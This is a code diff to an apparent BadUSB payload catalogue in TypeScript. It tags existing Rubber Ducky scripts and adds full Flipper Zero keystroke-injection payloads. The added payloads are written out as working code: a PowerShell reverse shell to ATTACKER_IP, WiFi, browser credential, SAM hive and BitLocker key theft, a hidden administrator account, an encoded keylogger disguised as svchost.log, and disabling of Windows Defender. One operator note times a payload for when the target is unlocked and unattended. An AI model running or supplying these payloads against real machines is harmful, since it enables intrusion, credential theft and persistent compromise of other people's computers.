@@ -11,6 +11,8 @@ export const DUCKY_SCRIPTS: DuckyScript[] = [
     riskLevel: 'low',
     executionTime: '~8s',
     detectionDifficulty: 'easy',
+    format: 'ducky',
+    flipperCompat: true,
     script: `REM Windows System Info Dump
 REM Opens PowerShell and dumps system information
 DELAY 1000
@@ -34,6 +36,8 @@ ENTER`
     riskLevel: 'low',
     executionTime: '~10s',
     detectionDifficulty: 'easy',
+    format: 'ducky',
+    flipperCompat: true,
     script: `REM Network Configuration Export
 DELAY 1000
 GUI r
@@ -56,6 +60,8 @@ ENTER`
     riskLevel: 'medium',
     executionTime: '~6s',
     detectionDifficulty: 'moderate',
+    format: 'ducky',
+    flipperCompat: true,
     script: `REM WiFi Password Harvester
 DELAY 1000
 GUI r
@@ -78,6 +84,8 @@ ENTER`
     riskLevel: 'low',
     executionTime: '~7s',
     detectionDifficulty: 'easy',
+    format: 'ducky',
+    flipperCompat: true,
     script: `REM Installed Software Enumeration
 DELAY 1000
 GUI r
@@ -100,6 +108,8 @@ ENTER`
     riskLevel: 'medium',
     executionTime: '~8s',
     detectionDifficulty: 'moderate',
+    format: 'ducky',
+    flipperCompat: true,
     script: `REM Browser History Export (Chrome)
 DELAY 1000
 GUI r
@@ -123,6 +133,8 @@ ENTER`,
     riskLevel: 'medium',
     executionTime: '~15s',
     detectionDifficulty: 'moderate',
+    format: 'ducky',
+    flipperCompat: true,
     script: `REM Active Directory Enumeration
 DELAY 1000
 GUI r
@@ -146,6 +158,8 @@ ENTER`,
     riskLevel: 'low',
     executionTime: '~5s',
     detectionDifficulty: 'easy',
+    format: 'ducky',
+    flipperCompat: true,
     script: `REM USB Device History
 DELAY 1000
 GUI r
@@ -168,6 +182,8 @@ ENTER`
     riskLevel: 'low',
     executionTime: '~4s',
     detectionDifficulty: 'easy',
+    format: 'ducky',
+    flipperCompat: true,
     script: `REM Clipboard History Dump
 DELAY 1000
 GUI r
@@ -192,6 +208,7 @@ ENTER`
     riskLevel: 'critical',
     executionTime: '~20s',
     detectionDifficulty: 'easy',
+    format: 'ducky',
     script: `REM SAM Database Dump via Mimikatz
 REM Requires administrative privileges
 DELAY 1000
@@ -213,6 +230,8 @@ DELAY 15000`,
     riskLevel: 'high',
     executionTime: '~10s',
     detectionDifficulty: 'moderate',
+    format: 'ducky',
+    flipperCompat: true,
     script: `REM Chrome Saved Passwords Extractor
 DELAY 1000
 GUI r
@@ -236,6 +255,8 @@ ENTER`,
     riskLevel: 'medium',
     executionTime: '~6s',
     detectionDifficulty: 'moderate',
+    format: 'ducky',
+    flipperCompat: true,
     script: `REM WiFi Credential Extraction
 DELAY 1000
 GUI r
@@ -258,6 +279,8 @@ ENTER`
     riskLevel: 'high',
     executionTime: '~5s',
     detectionDifficulty: 'moderate',
+    format: 'ducky',
+    flipperCompat: true,
     script: `REM SSH Key Exfiltration
 DELAY 1000
 GUI r
@@ -280,6 +303,8 @@ ENTER`
     riskLevel: 'high',
     executionTime: '~6s',
     detectionDifficulty: 'moderate',
+    format: 'ducky',
+    flipperCompat: true,
     script: `REM Windows Credential Manager Dump
 DELAY 1000
 GUI r
@@ -302,6 +327,8 @@ ENTER`
     riskLevel: 'high',
     executionTime: '~8s',
     detectionDifficulty: 'hard',
+    format: 'ducky',
+    flipperCompat: true,
     script: `REM Outlook Token Extraction
 DELAY 1000
 GUI r
@@ -324,6 +351,8 @@ ENTER`
     riskLevel: 'critical',
     executionTime: '~5s',
     detectionDifficulty: 'hard',
+    format: 'ducky',
+    flipperCompat: true,
     script: `REM PowerShell Keylogger Install
 DELAY 1000
 GUI r
@@ -347,6 +376,8 @@ ENTER`,
     riskLevel: 'high',
     executionTime: '~12s',
     detectionDifficulty: 'moderate',
+    format: 'ducky',
+    flipperCompat: true,
     script: `REM KeePass Database Locator
 DELAY 1000
 GUI r
@@ -371,6 +402,8 @@ ENTER`
     riskLevel: 'critical',
     executionTime: '~5s',
     detectionDifficulty: 'moderate',
+    format: 'ducky',
+    flipperCompat: true,
     script: `REM PowerShell Reverse Shell
 REM Replace ATTACKER_IP and PORT
 DELAY 1000
@@ -392,6 +425,8 @@ ENTER`,
     riskLevel: 'critical',
     executionTime: '~10s',
     detectionDifficulty: 'moderate',
+    format: 'ducky',
+    flipperCompat: true,
     script: `REM Netcat Reverse Shell
 REM Replace ATTACKER_IP
 DELAY 1000
@@ -413,6 +448,8 @@ ENTER`,
     riskLevel: 'critical',
     executionTime: '~5s',
     detectionDifficulty: 'moderate',
+    format: 'ducky',
+    flipperCompat: true,
     script: `REM Python Reverse Shell
 REM Replace ATTACKER_IP
 DELAY 1000
@@ -434,6 +471,8 @@ ENTER`,
     riskLevel: 'critical',
     executionTime: '~4s',
     detectionDifficulty: 'moderate',
+    format: 'ducky',
+    flipperCompat: true,
     script: `REM Bash Reverse Shell (Linux/macOS)
 REM Replace ATTACKER_IP
 DELAY 1000
@@ -461,6 +500,7 @@ ENTER`,
     riskLevel: 'critical',
     executionTime: '~12s',
     detectionDifficulty: 'hard',
+    format: 'ducky',
     script: `REM Meterpreter Stager (reverse_https)
 REM Replace ATTACKER_IP
 DELAY 1000
@@ -482,6 +522,7 @@ ENTER`,
     riskLevel: 'critical',
     executionTime: '~8s',
     detectionDifficulty: 'hard',
+    format: 'ducky',
     script: `REM PowerShell Empire Stager
 REM Replace STAGER_URL with Empire listener URL
 DELAY 1000
@@ -503,6 +544,7 @@ ENTER`,
     riskLevel: 'critical',
     executionTime: '~10s',
     detectionDifficulty: 'very-hard',
+    format: 'ducky',
     script: `REM Cobalt Strike Beacon Stager
 REM Replace TEAMSERVER_URL
 DELAY 1000
@@ -526,6 +568,8 @@ ENTER`,
     riskLevel: 'high',
     executionTime: '~4s',
     detectionDifficulty: 'easy',
+    format: 'ducky',
+    flipperCompat: true,
     script: `REM Registry Run Key Persistence
 DELAY 1000
 GUI r
@@ -549,6 +593,8 @@ ENTER`,
     riskLevel: 'high',
     executionTime: '~5s',
     detectionDifficulty: 'moderate',
+    format: 'ducky',
+    flipperCompat: true,
     script: `REM Scheduled Task Persistence
 DELAY 1000
 GUI r
@@ -571,6 +617,7 @@ ENTER`
     riskLevel: 'critical',
     executionTime: '~6s',
     detectionDifficulty: 'hard',
+    format: 'ducky',
     script: `REM WMI Event Subscription Persistence
 DELAY 1000
 GUI r
@@ -594,6 +641,8 @@ ENTER`,
     riskLevel: 'medium',
     executionTime: '~4s',
     detectionDifficulty: 'easy',
+    format: 'ducky',
+    flipperCompat: true,
     script: `REM Startup Folder Persistence
 DELAY 1000
 GUI r
@@ -616,6 +665,8 @@ ENTER`
     riskLevel: 'critical',
     executionTime: '~6s',
     detectionDifficulty: 'moderate',
+    format: 'ducky',
+    flipperCompat: true,
     script: `REM Windows Service Persistence
 REM Requires admin
 DELAY 1000
@@ -637,6 +688,7 @@ DELAY 3000`,
     riskLevel: 'critical',
     executionTime: '~15s',
     detectionDifficulty: 'very-hard',
+    format: 'ducky',
     script: `REM DLL Hijack Enumeration & Setup
 DELAY 1000
 GUI r
@@ -660,6 +712,8 @@ ENTER`,
     riskLevel: 'high',
     executionTime: '~5s',
     detectionDifficulty: 'moderate',
+    format: 'ducky',
+    flipperCompat: true,
     script: `REM Crontab Persistence (Linux)
 DELAY 1000
 CTRL ALT t
@@ -680,6 +734,8 @@ ENTER`,
     riskLevel: 'high',
     executionTime: '~6s',
     detectionDifficulty: 'moderate',
+    format: 'ducky',
+    flipperCompat: true,
     script: `REM macOS LaunchAgent Persistence
 DELAY 1000
 GUI SPACE
@@ -715,6 +771,8 @@ ENTER`
     riskLevel: 'high',
     executionTime: '~15s',
     detectionDifficulty: 'moderate',
+    format: 'ducky',
+    flipperCompat: true,
     script: `REM Document Grab - Recent Files
 DELAY 1000
 GUI r
@@ -738,6 +796,8 @@ ENTER`,
     riskLevel: 'medium',
     executionTime: '~6s',
     detectionDifficulty: 'moderate',
+    format: 'ducky',
+    flipperCompat: true,
     script: `REM Screenshot Capture & Upload
 DELAY 1000
 GUI r
@@ -761,6 +821,7 @@ ENTER`,
     riskLevel: 'high',
     executionTime: '~8s',
     detectionDifficulty: 'hard',
+    format: 'ducky',
     script: `REM Webcam Snapshot Capture
 DELAY 1000
 GUI r
@@ -791,6 +852,7 @@ ENTER`,
     riskLevel: 'high',
     executionTime: '~20s',
     detectionDifficulty: 'very-hard',
+    format: 'ducky',
     script: `REM DNS Exfiltration Channel
 DELAY 1000
 GUI r
@@ -811,6 +873,8 @@ ENTER`,
     riskLevel: 'high',
     executionTime: '~8s',
     detectionDifficulty: 'hard',
+    format: 'ducky',
+    flipperCompat: true,
     script: `REM Discord Webhook Exfiltration
 DELAY 1000
 GUI r
@@ -834,6 +898,8 @@ ENTER`,
     riskLevel: 'high',
     executionTime: '~10s',
     detectionDifficulty: 'moderate',
+    format: 'ducky',
+    flipperCompat: true,
     script: `REM Email Exfiltration via Outlook
 DELAY 1000
 GUI r
@@ -857,6 +923,8 @@ ENTER`,
     riskLevel: 'medium',
     executionTime: '~6s',
     detectionDifficulty: 'hard',
+    format: 'ducky',
+    flipperCompat: true,
     script: `REM Pastebin Exfiltration
 DELAY 1000
 GUI r
@@ -880,6 +948,8 @@ ENTER`,
     riskLevel: 'high',
     executionTime: '~10s',
     detectionDifficulty: 'moderate',
+    format: 'ducky',
+    flipperCompat: true,
     script: `REM FTP Exfiltration
 DELAY 1000
 GUI r
@@ -904,6 +974,8 @@ ENTER`
     riskLevel: 'high',
     executionTime: '~5s',
     detectionDifficulty: 'easy',
+    format: 'ducky',
+    flipperCompat: true,
     script: `REM DNS Spoof via hosts file
 REM Requires admin
 DELAY 1000
@@ -925,6 +997,8 @@ DELAY 2000`,
     riskLevel: 'high',
     executionTime: '~4s',
     detectionDifficulty: 'moderate',
+    format: 'ducky',
+    flipperCompat: true,
     script: `REM ARP Cache Poison
 DELAY 1000
 GUI r
@@ -945,6 +1019,8 @@ DELAY 2000`,
     riskLevel: 'critical',
     executionTime: '~4s',
     detectionDifficulty: 'easy',
+    format: 'ducky',
+    flipperCompat: true,
     script: `REM Disable Windows Firewall
 DELAY 1000
 GUI r
@@ -965,6 +1041,8 @@ DELAY 2000`,
     riskLevel: 'high',
     executionTime: '~4s',
     detectionDifficulty: 'moderate',
+    format: 'ducky',
+    flipperCompat: true,
     script: `REM System Proxy Configuration
 DELAY 1000
 GUI r
@@ -988,6 +1066,8 @@ ENTER`,
     riskLevel: 'medium',
     executionTime: '~5s',
     detectionDifficulty: 'easy',
+    format: 'ducky',
+    flipperCompat: true,
     script: `REM VPN Kill Switch
 DELAY 1000
 GUI r
@@ -1010,6 +1090,8 @@ ENTER`
     riskLevel: 'high',
     executionTime: '~4s',
     detectionDifficulty: 'moderate',
+    format: 'ducky',
+    flipperCompat: true,
     script: `REM Port Forward via netsh
 DELAY 1000
 GUI r
@@ -1030,6 +1112,8 @@ DELAY 2000`,
     riskLevel: 'medium',
     executionTime: '~4s',
     detectionDifficulty: 'easy',
+    format: 'ducky',
+    flipperCompat: true,
     script: `REM WiFi Disconnect and Profile Wipe
 DELAY 1000
 GUI r
@@ -1056,6 +1140,8 @@ ENTER`,
     riskLevel: 'high',
     executionTime: '~6s',
     detectionDifficulty: 'hard',
+    format: 'ducky',
+    flipperCompat: true,
     script: `REM SSH Reverse Tunnel
 DELAY 1000
 GUI r
@@ -1078,6 +1164,8 @@ ENTER`,
     riskLevel: 'critical',
     executionTime: '~5s',
     detectionDifficulty: 'easy',
+    format: 'ducky',
+    flipperCompat: true,
     script: `REM Disable Windows Defender
 DELAY 1000
 GUI r
@@ -1098,6 +1186,8 @@ DELAY 3000`,
     riskLevel: 'high',
     executionTime: '~3s',
     detectionDifficulty: 'hard',
+    format: 'ducky',
+    flipperCompat: true,
     script: `REM AMSI Bypass (Memory Patching)
 DELAY 1000
 GUI r
@@ -1119,6 +1209,7 @@ DELAY 500`,
     riskLevel: 'high',
     executionTime: '~3s',
     detectionDifficulty: 'hard',
+    format: 'ducky',
     script: `REM PowerShell CLM Bypass via InstallUtil
 DELAY 1000
 GUI r
@@ -1140,6 +1231,8 @@ DELAY 500`,
     riskLevel: 'critical',
     executionTime: '~4s',
     detectionDifficulty: 'moderate',
+    format: 'ducky',
+    flipperCompat: true,
     script: `REM UAC Bypass via fodhelper.exe
 DELAY 1000
 GUI r
@@ -1160,6 +1253,7 @@ ENTER`,
     riskLevel: 'high',
     executionTime: '~3s',
     detectionDifficulty: 'very-hard',
+    format: 'ducky',
     script: `REM ETW Patching (Disable Event Tracing)
 DELAY 1000
 GUI r
@@ -1181,6 +1275,8 @@ DELAY 2000`,
     riskLevel: 'high',
     executionTime: '~4s',
     detectionDifficulty: 'moderate',
+    format: 'ducky',
+    flipperCompat: true,
     script: `REM Disable PowerShell Logging
 DELAY 1000
 GUI r
@@ -1204,6 +1300,8 @@ ENTER`,
     riskLevel: 'high',
     executionTime: '~4s',
     detectionDifficulty: 'moderate',
+    format: 'ducky',
+    flipperCompat: true,
     script: `REM Add Defender Exclusion Path
 DELAY 1000
 GUI r
@@ -1224,6 +1322,8 @@ DELAY 2000`,
     riskLevel: 'medium',
     executionTime: '~3s',
     detectionDifficulty: 'hard',
+    format: 'ducky',
+    flipperCompat: true,
     script: `REM Timestamp Stomping
 DELAY 1000
 GUI r
@@ -1249,6 +1349,8 @@ ENTER`,
     riskLevel: 'low',
     executionTime: '~5s',
     detectionDifficulty: 'easy',
+    format: 'ducky',
+    flipperCompat: true,
     script: `REM Change Desktop Wallpaper
 DELAY 1000
 GUI r
@@ -1272,6 +1374,8 @@ ENTER`,
     riskLevel: 'low',
     executionTime: '~3s',
     detectionDifficulty: 'easy',
+    format: 'ducky',
+    flipperCompat: true,
     script: `REM Rick Roll
 DELAY 1000
 GUI r
@@ -1288,6 +1392,8 @@ ENTER`
     riskLevel: 'low',
     executionTime: '~2s',
     detectionDifficulty: 'easy',
+    format: 'ducky',
+    flipperCompat: true,
     script: `REM Flip Screen Upside Down
 REM Uses Intel Graphics shortcut (Ctrl+Alt+Down)
 DELAY 1000
@@ -1304,6 +1410,8 @@ DELAY 500`,
     riskLevel: 'low',
     executionTime: '~4s',
     detectionDifficulty: 'easy',
+    format: 'ducky',
+    flipperCompat: true,
     script: `REM Text-to-Speech Message
 DELAY 1000
 GUI r
@@ -1320,6 +1428,8 @@ ENTER`
     riskLevel: 'low',
     executionTime: '~2s',
     detectionDifficulty: 'easy',
+    format: 'ducky',
+    flipperCompat: true,
     script: `REM Mouse Jiggler
 DELAY 1000
 GUI r
@@ -1337,6 +1447,8 @@ ENTER`,
     riskLevel: 'low',
     executionTime: '~3s',
     detectionDifficulty: 'easy',
+    format: 'ducky',
+    flipperCompat: true,
     script: `REM Infinite Notepad Popup
 DELAY 1000
 GUI r
@@ -1354,6 +1466,8 @@ ENTER`,
     riskLevel: 'low',
     executionTime: '~3s',
     detectionDifficulty: 'easy',
+    format: 'ducky',
+    flipperCompat: true,
     script: `REM Fake Blue Screen of Death
 DELAY 1000
 GUI r
@@ -1371,6 +1485,8 @@ ENTER`,
     riskLevel: 'low',
     executionTime: '~2s',
     detectionDifficulty: 'easy',
+    format: 'ducky',
+    flipperCompat: true,
     script: `REM CD Tray Eject Loop
 DELAY 1000
 GUI r
@@ -1388,6 +1504,8 @@ ENTER`,
     riskLevel: 'low',
     executionTime: '~2s',
     detectionDifficulty: 'easy',
+    format: 'ducky',
+    flipperCompat: true,
     script: `REM Caps Lock Chaos
 DELAY 1000
 GUI r
@@ -1405,6 +1523,8 @@ ENTER`,
     riskLevel: 'low',
     executionTime: '~5s',
     detectionDifficulty: 'easy',
+    format: 'ducky',
+    flipperCompat: true,
     script: `REM Fake Desktop Freeze
 DELAY 1000
 GUI r
@@ -1420,5 +1540,822 @@ ENTER
 STRING exit
 ENTER`,
     notes: 'Makes it look like the desktop is frozen. Icons seem unclickable because they are just an image.'
+  },
+
+  // ==================== FLIPPER ZERO BADUSB ====================
+  // Windows Flipper payloads
+  {
+    id: 'flipper-wifi-grab-sd',
+    name: '[Flipper] WiFi Password Grabber to SD',
+    category: 'credentials',
+    description: 'Extracts all stored WiFi passwords via PowerShell and saves them to the Flipper Zero SD card via a mounted drive.',
+    targetOS: ['windows'],
+    riskLevel: 'medium',
+    executionTime: '~10s',
+    detectionDifficulty: 'moderate',
+    format: 'flipper',
+    script: `REM Flipper Zero WiFi Password Grabber
+REM Saves output to Flipper SD card
+DEFAULT_DELAY 20
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING $profiles = netsh wlan show profiles | Select-String "\\:(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }; $results = @(); foreach($p in $profiles){ $detail = netsh wlan show profile name="$p" key=clear; $key = ($detail | Select-String "Key Content\\W+\\:(.+)$").Matches.Groups[1].Value.Trim(); $results += "$p : $key" }; $drv = (Get-Volume | Where-Object { $_.FileSystemLabel -eq 'Flipper SD' }).DriveLetter; if($drv){ $results | Out-File "$($drv):\\loot\\wifi_passwords.txt" } else { $results | Out-File "$env:TEMP\\wifi_passwords.txt" }
+ENTER
+DELAY 3000
+STRING exit
+ENTER`
+  },
+  {
+    id: 'flipper-sysinfo-sd',
+    name: '[Flipper] System Info Exfil to SD',
+    category: 'recon',
+    description: 'Gathers comprehensive system info and writes it directly to the Flipper Zero SD card for offline retrieval.',
+    targetOS: ['windows'],
+    riskLevel: 'low',
+    executionTime: '~12s',
+    detectionDifficulty: 'moderate',
+    format: 'flipper',
+    script: `REM Flipper Zero System Info Exfiltration
+DEFAULT_DELAY 20
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING $info = @(); $info += "=== COMPUTER NAME: $env:COMPUTERNAME ==="; $info += "=== USER: $env:USERNAME ==="; $info += (systeminfo | Out-String); $info += "=== NETWORK ==="; $info += (ipconfig /all | Out-String); $info += "=== USERS ==="; $info += (net user | Out-String); $info += "=== INSTALLED SOFTWARE ==="; $info += (Get-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select DisplayName, DisplayVersion | Out-String); $drv = (Get-Volume | Where-Object { $_.FileSystemLabel -eq 'Flipper SD' }).DriveLetter; $outPath = if($drv){"$($drv):\\loot\\sysinfo.txt"} else {"$env:TEMP\\sysinfo.txt"}; $info | Out-File $outPath
+ENTER
+DELAY 5000
+STRING exit
+ENTER`
+  },
+  {
+    id: 'flipper-revshell-ps',
+    name: '[Flipper] PowerShell Reverse Shell',
+    category: 'reverse-shells',
+    description: 'Flipper Zero BadUSB payload that opens a reverse PowerShell shell to the attacker with WAIT_FOR_BUTTON_PRESS for timing control.',
+    targetOS: ['windows'],
+    riskLevel: 'critical',
+    executionTime: '~8s',
+    detectionDifficulty: 'moderate',
+    format: 'flipper',
+    script: `REM Flipper Zero Reverse Shell
+REM Press Flipper button when target is unlocked and unattended
+DEFAULT_DELAY 20
+WAIT_FOR_BUTTON_PRESS
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass
+ENTER
+DELAY 1000
+STRING $c = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4444); $s = $c.GetStream(); [byte[]]$b = 0..65535|%{0}; while(($i = $s.Read($b, 0, $b.Length)) -ne 0){ $d = (New-Object System.Text.ASCIIEncoding).GetString($b,0,$i); $r = (iex $d 2>&1 | Out-String); $r2 = $r + "PS " + (pwd).Path + "> "; $sb = ([text.encoding]::ASCII).GetBytes($r2); $s.Write($sb,0,$sb.Length); $s.Flush() }; $c.Close()
+ENTER`,
+    notes: 'Replace ATTACKER_IP. Uses WAIT_FOR_BUTTON_PRESS for operator-controlled timing.'
+  },
+  {
+    id: 'flipper-disable-defender',
+    name: '[Flipper] Disable Windows Defender',
+    category: 'evasion',
+    description: 'Uses Flipper Zero to disable Windows Defender real-time protection with HOLD/RELEASE for reliable key combos.',
+    targetOS: ['windows'],
+    riskLevel: 'critical',
+    executionTime: '~8s',
+    detectionDifficulty: 'easy',
+    format: 'flipper',
+    script: `REM Flipper Zero - Disable Windows Defender
+DEFAULT_DELAY 20
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-WindowStyle Hidden -Command Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -DisableIOAVProtection $true -MAPSReporting 0 -SubmitSamplesConsent 2'"
+ENTER
+DELAY 1500
+REM Accept UAC prompt
+ALT y
+DELAY 3000`,
+    notes: 'Requires admin. Tamper Protection may block on newer Windows builds.'
+  },
+  {
+    id: 'flipper-create-admin',
+    name: '[Flipper] Create Hidden Admin User',
+    category: 'persistence',
+    description: 'Creates a hidden administrator user account via Flipper Zero BadUSB for persistent access.',
+    targetOS: ['windows'],
+    riskLevel: 'critical',
+    executionTime: '~8s',
+    detectionDifficulty: 'moderate',
+    format: 'flipper',
+    script: `REM Flipper Zero - Create Hidden Admin User
+DEFAULT_DELAY 20
+WAIT_FOR_BUTTON_PRESS
+GUI r
+DELAY 500
+STRING powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-WindowStyle Hidden -Command net user SvcAdmin P@ssw0rd123! /add; net localgroup administrators SvcAdmin /add; reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v SvcAdmin /t REG_DWORD /d 0 /f'"
+ENTER
+DELAY 1500
+ALT y
+DELAY 3000`,
+    notes: 'Creates user "SvcAdmin" hidden from login screen. Requires admin/UAC bypass.'
+  },
+  {
+    id: 'flipper-sam-dump',
+    name: '[Flipper] SAM Hash Dump',
+    category: 'credentials',
+    description: 'Dumps SAM database hashes using reg save and copies them to a retrievable location. Uses HOLD/RELEASE for reliability.',
+    targetOS: ['windows'],
+    riskLevel: 'critical',
+    executionTime: '~12s',
+    detectionDifficulty: 'moderate',
+    format: 'flipper',
+    script: `REM Flipper Zero SAM Hash Dump
+DEFAULT_DELAY 20
+WAIT_FOR_BUTTON_PRESS
+GUI r
+DELAY 500
+STRING powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-WindowStyle Hidden -Command reg save HKLM\\SAM C:\\Users\\Public\\sam.save /y; reg save HKLM\\SYSTEM C:\\Users\\Public\\system.save /y; reg save HKLM\\SECURITY C:\\Users\\Public\\security.save /y'"
+ENTER
+DELAY 1500
+ALT y
+DELAY 5000`,
+    notes: 'Requires admin. Extract hashes offline with secretsdump.py or mimikatz.'
+  },
+  {
+    id: 'flipper-browser-creds',
+    name: '[Flipper] Browser Credential Harvester',
+    category: 'credentials',
+    description: 'Harvests saved browser credentials from Chrome and Edge, saves to Flipper SD or temp directory.',
+    targetOS: ['windows'],
+    riskLevel: 'high',
+    executionTime: '~15s',
+    detectionDifficulty: 'moderate',
+    format: 'flipper',
+    script: `REM Flipper Zero Browser Credential Harvester
+DEFAULT_DELAY 20
+STRINGDELAY 20
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING $chromePath = "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data"; $edgePath = "$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Login Data"; $dest = "$env:TEMP\\browser_loot"; New-Item -ItemType Directory -Force -Path $dest | Out-Null; if(Test-Path $chromePath){ Copy-Item $chromePath "$dest\\chrome_logins.db" -Force }; if(Test-Path $edgePath){ Copy-Item $edgePath "$dest\\edge_logins.db" -Force }; $drv = (Get-Volume | Where-Object { $_.FileSystemLabel -eq 'Flipper SD' }).DriveLetter; if($drv){ Copy-Item "$dest\\*" "$($drv):\\loot\\" -Force }
+ENTER
+DELAY 5000
+STRING exit
+ENTER`,
+    notes: 'Copies encrypted login databases. Decrypt offline with tools like LaZagne.'
+  },
+  {
+    id: 'flipper-keylogger',
+    name: '[Flipper] Keylogger Installer',
+    category: 'credentials',
+    description: 'Deploys a lightweight PowerShell keylogger that logs keystrokes to a hidden file. Uses WAIT_FOR_BUTTON_PRESS.',
+    targetOS: ['windows'],
+    riskLevel: 'critical',
+    executionTime: '~6s',
+    detectionDifficulty: 'hard',
+    format: 'flipper',
+    script: `REM Flipper Zero Keylogger Deployment
+DEFAULT_DELAY 20
+WAIT_FOR_BUTTON_PRESS
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING $code = '$api = Add-Type -MemberDefinition ''[DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);'' -Name "KL" -PassThru; $logFile = "$env:APPDATA\\svchost.log"; while($true){ for($i=8;$i -le 190;$i++){ if($api::GetAsyncKeyState($i) -eq -32767){ $key = [System.Enum]::GetName([System.Windows.Forms.Keys],$i); $ts = Get-Date -Format "HH:mm:ss"; "$ts : $key" | Out-File $logFile -Append }}; Start-Sleep -Milliseconds 40}'; $bytes = [System.Text.Encoding]::Unicode.GetBytes($code); $encoded = [Convert]::ToBase64String($bytes); Start-Process powershell -ArgumentList "-WindowStyle Hidden -EncodedCommand $encoded" -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING exit
+ENTER`,
+    notes: 'Keystrokes logged to %APPDATA%\\svchost.log. Runs until process killed.'
+  },
+  {
+    id: 'flipper-screenshot-exfil',
+    name: '[Flipper] Screenshot + Exfil',
+    category: 'exfiltration',
+    description: 'Captures a screenshot and saves it to the Flipper Zero SD card for physical retrieval.',
+    targetOS: ['windows'],
+    riskLevel: 'medium',
+    executionTime: '~8s',
+    detectionDifficulty: 'moderate',
+    format: 'flipper',
+    script: `REM Flipper Zero Screenshot Capture to SD
+DEFAULT_DELAY 20
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING Add-Type -AssemblyName System.Windows.Forms; $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height); $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size); $drv = (Get-Volume | Where-Object { $_.FileSystemLabel -eq 'Flipper SD' }).DriveLetter; $path = if($drv){"$($drv):\\loot\\screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"} else {"$env:TEMP\\screenshot.png"}; $bitmap.Save($path)
+ENTER
+DELAY 3000
+STRING exit
+ENTER`
+  },
+  {
+    id: 'flipper-ransomware-sim',
+    name: '[Flipper] Ransomware Simulator (Educational)',
+    category: 'pranks',
+    description: 'Educational ransomware simulation - renames files on the Desktop with .encrypted extension. Files can be restored by removing the extension.',
+    targetOS: ['windows'],
+    riskLevel: 'medium',
+    executionTime: '~8s',
+    detectionDifficulty: 'easy',
+    format: 'flipper',
+    script: `REM Flipper Zero Ransomware Simulator (EDUCATIONAL ONLY)
+REM Only renames files - does NOT encrypt anything
+DEFAULT_DELAY 20
+WAIT_FOR_BUTTON_PRESS
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING $desktop = [Environment]::GetFolderPath("Desktop"); Get-ChildItem $desktop -File | Where-Object { $_.Extension -ne ".encrypted" } | ForEach-Object { Rename-Item $_.FullName "$($_.FullName).encrypted" }; $note = "YOUR FILES HAVE BEEN ENCRYPTED (not really - this is a simulation)`nTo restore: remove the .encrypted extension from each file`nThis was a security awareness demonstration."; $note | Out-File "$desktop\\RANSOM_NOTE.txt"; Start-Process notepad "$desktop\\RANSOM_NOTE.txt"
+ENTER
+DELAY 2000
+STRING exit
+ENTER`,
+    notes: 'EDUCATIONAL ONLY. Simply renames files. Restore by removing .encrypted extension.'
+  },
+  {
+    id: 'flipper-bitlocker-key',
+    name: '[Flipper] BitLocker Key Extractor',
+    category: 'credentials',
+    description: 'Extracts BitLocker recovery keys from the system and saves to Flipper SD card.',
+    targetOS: ['windows'],
+    riskLevel: 'high',
+    executionTime: '~8s',
+    detectionDifficulty: 'moderate',
+    format: 'flipper',
+    script: `REM Flipper Zero BitLocker Key Extractor
+DEFAULT_DELAY 20
+WAIT_FOR_BUTTON_PRESS
+GUI r
+DELAY 500
+STRING powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-WindowStyle Hidden -Command $keys = (Get-BitLockerVolume | Select-Object -ExpandProperty KeyProtector | Where-Object { $_.KeyProtectorType -eq \"RecoveryPassword\" } | Select-Object -ExpandProperty RecoveryPassword); $drv = (Get-Volume | Where-Object { $_.FileSystemLabel -eq \"Flipper SD\" }).DriveLetter; $out = if($drv){\"$($drv):\\loot\\bitlocker_keys.txt\"} else {\"$env:TEMP\\bitlocker_keys.txt\"}; $keys | Out-File $out'"
+ENTER
+DELAY 1500
+ALT y
+DELAY 3000`,
+    notes: 'Requires admin privileges. Only works if BitLocker is enabled on the system.'
+  },
+  {
+    id: 'flipper-netshare-map',
+    name: '[Flipper] Network Share Mapper',
+    category: 'recon',
+    description: 'Discovers and maps all accessible network shares, saving results to Flipper SD card.',
+    targetOS: ['windows'],
+    riskLevel: 'medium',
+    executionTime: '~15s',
+    detectionDifficulty: 'moderate',
+    format: 'flipper',
+    script: `REM Flipper Zero Network Share Mapper
+DEFAULT_DELAY 20
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
